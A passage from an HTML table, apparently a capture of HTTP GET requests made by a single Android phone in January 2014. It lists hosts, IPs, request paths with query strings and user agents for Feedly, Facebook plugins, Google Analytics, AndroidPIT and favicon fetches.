      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /s2/favicons?domain=casadefazdeconta.com&amp;alt=feed</td>
      <td>                                                                                                                                                                  null (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)</td>
    </tr>
    <tr>
      <th>136</th>
      <td> 101006</td>
      <td>  173.194.70.132</td>
      <td>          themes.googleusercontent.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            /s2/favicons?domain=dinheirovivo.pt&amp;alt=feed</td>
      <td>                                                                                                                                                                  null (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)</td>
    </tr>
    <tr>
      <th>137</th>
      <td> 101007</td>
      <td>  173.194.70.132</td>
      <td>          themes.googleusercontent.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 /s2/favicons?domain=tumblr.com&amp;alt=feed</td>
      <td>                                                                                                                                                                  null (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)</td>
    </tr>
    <tr>
      <th>138</th>
      <td>  28674</td>
      <td>  173.194.70.132</td>
      <td>          themes.googleusercontent.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 /s2/favicons?domain=www.mdr.de&amp;alt=feed</td>
      <td>                                                                                                                                                                  null (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)</td>
    </tr>
    <tr>
      <th>139</th>
      <td> 127813</td>
      <td>  173.194.70.132</td>
      <td>          themes.googleusercontent.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 /s2/favicons?domain=www.ndr.de&amp;alt=feed</td>
      <td>                                                                                                                                                                  null (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)</td>
    </tr>
    <tr>
      <th>140</th>
      <td> 127814</td>
      <td>  173.194.70.132</td>
      <td>          themes.googleusercontent.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         /s2/favicons?domain=www1.sportschau.de&amp;alt=feed</td>
      <td>                                                                                                                                                                  null (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)</td>
    </tr>
    <tr>
      <th>141</th>
      <td>  28675</td>
      <td>  173.194.70.132</td>
      <td>          themes.googleusercontent.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                /s2/favicons?domain=www1.wdr.de&amp;alt=feed</td>
      <td>                                                                                                                                                                  null (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)</td>
    </tr>
    <tr>
      <th>142</th>
      <td>  19796</td>
      <td>  173.194.70.132</td>
      <td>          themes.googleusercontent.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               /static/fonts/opensans/v7/MTP_ySUJH_bn48VBG8sNSndckgy16U_L-eNUgMz0EAk.ttf</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>143</th>
      <td>  19795</td>
      <td>  173.194.70.132</td>
      <td>          themes.googleusercontent.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               /static/fonts/opensans/v7/RjgO7rYTmqiVp7vzi-Q5USZ2oysoEQEeKwjgmXLRnTc.ttf</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>144</th>
      <td>  90070</td>
      <td>  173.194.70.132</td>
      <td>          themes.googleusercontent.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                /static/fonts/roboto/v10/Hgo13k-tfSpn0qi1SFdUfSZ2oysoEQEeKwjgmXLRnTc.ttf</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>145</th>
      <td> 105738</td>
      <td> 194.232.116.172</td>
      <td>                         tvthek.orf.at</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   /dynamic/get_asset.php?a=orf_programs%2Flogo%2F1915503.jpg&amp;h=98169862358ff9a5497768a7b86aca9df89aa99a</td>
      <td>                                                                                                                                                                  null (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)</td>
    </tr>
    <tr>
      <th>146</th>
      <td>  98306</td>
      <td>  98.137.204.103</td>
      <td>                 weather.yahooapis.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              /forecastrss?w=2345496&amp;u=c</td>
      <td>                                                                                                                                                                                                              Ultimate DayDream</td>
    </tr>
    <tr>
      <th>147</th>
      <td>  90543</td>
      <td>    176.9.190.33</td>
      <td>                     www.androidpit.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                /apps/app2-teaser-popup?xl=true&amp;ooc=true</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>148</th>
      <td>  87890</td>
      <td>    176.9.190.33</td>
      <td>                     www.androidpit.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      /de/android/forum/thread/573726/slimbean-Build-4-3</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>149</th>
      <td>  90540</td>
      <td>    176.9.190.33</td>
      <td>                     www.androidpit.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        /favicon.ico?v=3</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>150</th>
      <td>  89663</td>
      <td>    176.9.190.33</td>
      <td>                     www.androidpit.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        /nagScreen/popup</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>151</th>
      <td>  39831</td>
      <td>    216.10.120.7</td>
      <td>                      www.burstnet.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        /user/3/?redirect=http%3A%2F%2Fs.amazon-adsystem.com%2Fecm3%3Fid%3D%24UID%26ex%3Dadconductor.com</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>152</th>
      <td>  39774</td>
      <td>    31.13.81.128</td>
      <td>                      www.facebook.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               /fr/u.php?p=221790734642435&amp;m=3ltDx98WRvqCEwbUdtkJbQ&amp;r=us</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>153</th>
      <td>   5676</td>
      <td>    31.13.81.144</td>
      <td>                      www.facebook.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                    /plugins/like.php?action=recommend&amp;api_key=268419256515542&amp;channel_url=http%3A%2F%2Fstatic.ak.facebook.com%2Fconnect%2Fxd_arbiter.php%3Fversion%3D28%23cb%3Df1786c6af4%26domain%3Dwww.sueddeutsche.de%26origin%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Ff633042fc%26relation%3Dparent.parent&amp;colorscheme=light&amp;extended_social_context=false&amp;font=arial&amp;href=http%3A%2F%2Fwww.sueddeutsche.de%2Fmuenchen%2Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074&amp;layout=box_count&amp;locale=de_DE&amp;node_type=link&amp;sdk=joey&amp;send=false&amp;show_faces=false&amp;width=115</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>154</th>
      <td> 132771</td>
      <td>     31.13.81.81</td>
      <td>                      www.facebook.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                      /plugins/like.php?action=recommend&amp;api_key=268419256515542&amp;channel_url=http%3A%2F%2Fstatic.ak.facebook.com%2Fconnect%2Fxd_arbiter.php%3Fversion%3D28%23cb%3Df2ed5bc97%26domain%3Dwww.sueddeutsche.de%26origin%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Ff194ee9f04%26relation%3Dparent.parent&amp;colorscheme=light&amp;extended_social_context=false&amp;font=arial&amp;href=http%3A%2F%2Fwww.sueddeutsche.de%2Fkarriere%2Fstudie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne-1.1866212&amp;layout=box_count&amp;locale=de_DE&amp;node_type=link&amp;sdk=joey&amp;send=false&amp;show_faces=false&amp;width=115</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>155</th>
      <td>  16882</td>
      <td>    31.13.81.128</td>
      <td>                      www.facebook.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                       /plugins/like.php?action=recommend&amp;api_key=268419256515542&amp;channel_url=http%3A%2F%2Fstatic.ak.facebook.com%2Fconnect%2Fxd_arbiter.php%3Fversion%3D28%23cb%3Dfe08343b8%26domain%3Dwww.sueddeutsche.de%26origin%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Ff33f5d0024%26relation%3Dparent.parent&amp;colorscheme=light&amp;extended_social_context=false&amp;font=arial&amp;href=http%3A%2F%2Fwww.sueddeutsche.de%2Fdigital%2Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis-1.1866025&amp;layout=box_count&amp;locale=de_DE&amp;node_type=link&amp;sdk=joey&amp;send=false&amp;show_faces=false&amp;width=115</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>156</th>
      <td>    877</td>
      <td>     65.19.138.1</td>
      <td>                        www.feedly.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                /config-overlay.v5.json?ck=1390050786306</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>157</th>
      <td>    912</td>
      <td>     65.19.138.1</td>
      <td>                        www.feedly.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                /v3/markers/counts?ck=1390050791248&amp;ct=feedly.mobile.android.1&amp;cv=18.0.4</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>158</th>
      <td>    913</td>
      <td>     65.19.138.1</td>
      <td>                        www.feedly.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      /v3/mixes/contents?streamId=user%2F66d95ad3-e977-4150-b00a-8c5d808ecdda%2Fcategory%2FBlogs&amp;count=6&amp;ck=1390050791276&amp;backfill=true&amp;boostMustRead=true&amp;hours=14&amp;ct=feedly.mobile.android.1&amp;cv=18.0.4&amp;unreadOnly=true</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>159</th>
      <td>    929</td>
      <td>     65.19.138.1</td>
      <td>                        www.feedly.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                /v3/mixes/contents?streamId=user%2F66d95ad3-e977-4150-b00a-8c5d808ecdda%2Fcategory%2FDeutschland&amp;count=6&amp;ck=1390050792054&amp;backfill=true&amp;boostMustRead=true&amp;hours=14&amp;ct=feedly.mobile.android.1&amp;cv=18.0.4&amp;unreadOnly=true</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>160</th>
      <td>    880</td>
      <td>     65.19.138.1</td>
      <td>                        www.feedly.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   /v3/preferences?ck=1390050786725&amp;ct=feedly.mobile.android.1&amp;cv=18.0.4</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>161</th>
      <td>    883</td>
      <td>     65.19.138.1</td>
      <td>                        www.feedly.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /v3/profile?ck=1390050786734&amp;ct=feedly.mobile.android.1&amp;cv=18.0.4</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>162</th>
      <td>    886</td>
      <td>     65.19.138.1</td>
      <td>                        www.feedly.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 /v3/subscriptions?ck=1390050786739&amp;ct=feedly.mobile.android.1&amp;cv=18.0.4</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>163</th>
      <td>   1242</td>
      <td>  173.194.70.113</td>
      <td>              www.google-analytics.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        /__utm.gif?utmwv=4.8.1ma&amp;utmn=319752051&amp;utme=8(1!clientType*2!feedlyVersion*3!wave*4!logged*5!transition)9(1!android.1*2!18.0.4*3!2013.17*4!yes*5!stack)11(1!1*2!1*3!1*4!1*5!1)&amp;utmcs=UTF-8&amp;utmsr=800x1280&amp;utmul=de-DE&amp;utmp=%2Fmy&amp;utmac=UA-46940058-1&amp;utmcc=__utma%3D1.580923361.1368709109.1389969064.1390050791.142%3B&amp;utmhid=1408137172&amp;aip=1&amp;utmht=1390050791286&amp;utmqt=10062</td>
      <td>                                                                                                                                                  GoogleAnalytics/1.4.2 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I)</td>
    </tr>
    <tr>
      <th>164</th>
      <td>  20744</td>
      <td>  173.194.70.102</td>
      <td>              www.google-analytics.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                 /__utm.gif?utmwv=5.4.6&amp;utms=1&amp;utmn=1693448053&amp;utmhn=intelcrawler.com&amp;utmcs=UTF-8&amp;utmsr=800x1280&amp;utmvp=479x710&amp;utmsc=32-bit&amp;utmul=de-de&amp;utmje=0&amp;utmfl=-&amp;utmdt=IntelCrawler%20-%20Multi-tier%20Intelligence%20Aggregator%20-%20%22Decebal%22%20Point-of-Sale%20Malware%20-%20400%20lines%20of%20VBScript%20code%20from%20Romania%2C%20researchers%20warns%20about%20evolution%20of%20threats%20and%20interests%20to%20modern%20retailers&amp;utmhid=622979055&amp;utmr=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fintelcrawler.com%252Fabout%252Fpress07&amp;utmp=%2Fabout%2Fpress07&amp;utmht=1390051703933&amp;utmac=UA-12964573-5&amp;utmcc=__utma%3D238268888.570751254.1390051692.1390051704.1390051704.1%3B%2B__utmz%3D238268888.1390051704.1.1.utmcsr%3Dflipboard.com%7Cutmccn%3D(referral)%7Cutmcmd%3Dreferral%7Cutmcct%3D%2Fredirect%3B&amp;utmu=CAAgAAAAACAAAAAAAAAB~</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>165</th>
      <td>  89794</td>
      <td>  173.194.70.100</td>
      <td>              www.google-analytics.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /__utm.gif?utmwv=5.4.6&amp;utms=1&amp;utmn=1835366899&amp;utmhn=www.androidpit.de&amp;utmt=var&amp;utmht=1390123642976&amp;utmac=UA-7489116-13&amp;utmcc=__utma%3D228547149.678182810.1388960726.1389614896.1390123639.3%3B%2B__utmz%3D228547149.1388960730.1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct)%7Cutmcmd%3D(none)%3B%2B__utmv%3D228547149.st_teaser_bar_v3%2520%253D%25203%3B&amp;utmu=oQAQAAAAAAAAAAAAAAQ~</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>166</th>
      <td> 136926</td>
      <td> 173.194.116.168</td>
      <td>              www.google-analytics.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                               /__utm.gif?utmwv=5.4.6&amp;utms=1&amp;utmn=541863565&amp;utmhn=m.faz.net&amp;utmcs=UTF-8&amp;utmsr=800x1280&amp;utmvp=479x710&amp;utmsc=32-bit&amp;utmul=de-de&amp;utmje=0&amp;utmfl=-&amp;utmdt=Nach%2048%20Tagen%3A%20Sechzehnj%C3%A4hriger%20erreicht%20S%C3%BCdpol%20auf%20Skiern%20-%20Menschen%20-%20FAZ&amp;utmhid=2126014730&amp;utmr=-&amp;utmp=%2Faktuell%2Fgesellschaft%2Fmenschen%2Fnach-48-tagen-sechzehnjaehriger-erreicht-suedpol-auf-skiern-12759067.html&amp;utmht=1390147721385&amp;utmac=UA-579018-29&amp;utmcc=__utma%3D176063486.1784137468.1390039726.1390051124.1390147721.4%3B%2B__utmz%3D176063486.1390039726.1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct)%7Cutmcmd%3D(none)%3B&amp;utmu=q~</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>167</th>
      <td>  12729</td>
      <td>  173.194.70.100</td>
      <td>              www.google-analytics.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                    /__utm.gif?utmwv=5.4.6&amp;utms=1&amp;utmn=929417289&amp;utmhn=m.faz.net&amp;utmcs=UTF-8&amp;utmsr=800x1280&amp;utmvp=479x710&amp;utmsc=32-bit&amp;utmul=de-de&amp;utmje=0&amp;utmfl=-&amp;utmdt=Sozialleistungen%3A%20Neuer%20Streit%20um%20Hartz%20IV%20f%C3%BCr%20Rum%C3%A4nen%20und%20Bulgaren%20-%20Wirtschaft%20-%20FAZ&amp;utmhid=1516003805&amp;utmr=-&amp;utmp=%2Faktuell%2Fwirtschaft%2Fsozialleistungen-neuer-streit-um-hartz-iv-fuer-rumaenen-und-bulgaren-12757096.html&amp;utmht=1390051124276&amp;utmac=UA-579018-29&amp;utmcc=__utma%3D176063486.1784137468.1390039726.1390044476.1390051124.3%3B%2B__utmz%3D176063486.1390039726.1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct)%7Cutmcmd%3D(none)%3B&amp;utmu=q~</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>168</th>
      <td>  89863</td>
      <td>  173.194.70.100</td>
      <td>              www.google-analytics.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                 /__utm.gif?utmwv=5.4.6&amp;utms=2&amp;utmn=1853522898&amp;utmhn=www.androidpit.de&amp;utme=8(st_teaser_bar_v3_%5Buser%5D*5!st_teaser_bar_v3_%5Bsession%5D*st_teaser_bar_v3_%5Bpage%5D)9(3*5!3*3)11(1*5!2)&amp;utmcs=UTF-8&amp;utmsr=800x1280&amp;utmvp=320x240&amp;utmsc=32-bit&amp;utmul=de-de&amp;utmje=0&amp;utmfl=-&amp;utmdt=slimbean%20Build%204.3%20%E2%80%94%20Android%20Forum%20-%20AndroidPIT&amp;utmhid=1042539821&amp;utmr=-&amp;utmp=%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3&amp;utmht=1390123643001&amp;utmac=UA-7489116-13&amp;utmcc=__utma%3D228547149.678182810.1388960726.1389614896.1390123639.3%3B%2B__utmz%3D228547149.1388960730.1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct)%7Cutmcmd%3D(none)%3B%2B__utmv%3D228547149.st_teaser_bar_v3%2520%253D%25203%3B&amp;utmu=qQAQAAAAAAAAAAAAAAQ~</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>169</th>
      <td>  89909</td>
      <td>  173.194.70.100</td>
      <td>              www.google-analytics.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            /__utm.gif?utmwv=5.4.6&amp;utms=3&amp;utmn=2092754937&amp;utmhn=www.androidpit.de&amp;utmt=var&amp;utmht=1390123643057&amp;utmac=UA-7489116-1&amp;utmcc=__utma%3D228547149.678182810.1388960726.1389614896.1390123639.3%3B%2B__utmz%3D228547149.1388960730.1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct)%7Cutmcmd%3D(none)%3B%2B__utmv%3D228547149.st_teaser_bar_v3%2520%253D%25203%3B&amp;utmmt=1&amp;utmu=qQAwAAAAAAAAAAAAAAQAAAB~</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>170</th>
      <td>  89910</td>
      <td>  173.194.70.100</td>
      <td>              www.google-analytics.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                       /__utm.gif?utmwv=5.4.6&amp;utms=4&amp;utmn=937544652&amp;utmhn=www.androidpit.de&amp;utme=8(st_teaser_bar_v3_%5Buser%5D*5!st_teaser_bar_v3_%5Bsession%5D*st_teaser_bar_v3_%5Bpage%5D)9(3*5!3*3)11(1*5!2)&amp;utmcs=UTF-8&amp;utmsr=800x1280&amp;utmvp=320x240&amp;utmsc=32-bit&amp;utmul=de-de&amp;utmje=0&amp;utmfl=-&amp;utmdt=slimbean%20Build%204.3%20%E2%80%94%20Android%20Forum%20-%20AndroidPIT&amp;utmhid=1042539821&amp;utmr=-&amp;utmp=%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3&amp;utmht=1390123643073&amp;utmac=UA-7489116-1&amp;utmcc=__utma%3D228547149.678182810.1388960726.1389614896.1390123639.3%3B%2B__utmz%3D228547149.1388960730.1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct)%7Cutmcmd%3D(none)%3B%2B__utmv%3D228547149.st_teaser_bar_v3%2520%253D%25203%3B&amp;utmmt=1&amp;utmu=qQAwAAAAAAAAAAAAAAQAAAB~</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>171</th>
      <td>  89911</td>
      <td>  173.194.70.100</td>
      <td>              www.google-analytics.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            /__utm.gif?utmwv=5.4.6&amp;utms=5&amp;utmn=519479110&amp;utmhn=www.androidpit.de&amp;utmt=var&amp;utmht=1390123643111&amp;utmac=UA-7489116-21&amp;utmcc=__utma%3D228547149.678182810.1388960726.1389614896.1390123639.3%3B%2B__utmz%3D228547149.1388960730.1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct)%7Cutmcmd%3D(none)%3B%2B__utmv%3D228547149.st_teaser_bar_v3%2520%253D%25203%3B&amp;utmmt=1&amp;utmu=qQAwAAAAAAAAAAAAAAQAAAB~</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>172</th>
      <td>  89912</td>
      <td>  173.194.70.100</td>
      <td>              www.google-analytics.com</td>
      <td> GET</td>
